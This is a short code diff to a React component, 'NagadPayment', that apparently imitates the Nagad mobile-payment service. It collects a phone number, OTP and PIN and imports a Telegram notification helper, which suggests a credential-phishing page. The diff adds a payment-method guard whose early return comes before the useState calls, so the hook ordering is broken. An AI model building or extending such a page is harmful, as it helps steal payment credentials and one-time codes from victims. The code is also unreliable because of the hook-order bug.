@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
@@ -8,6 +9,8 @@ const NagadPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const checking = usePaymentMethodGuard("nagad");
+  if (checking) return null;
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
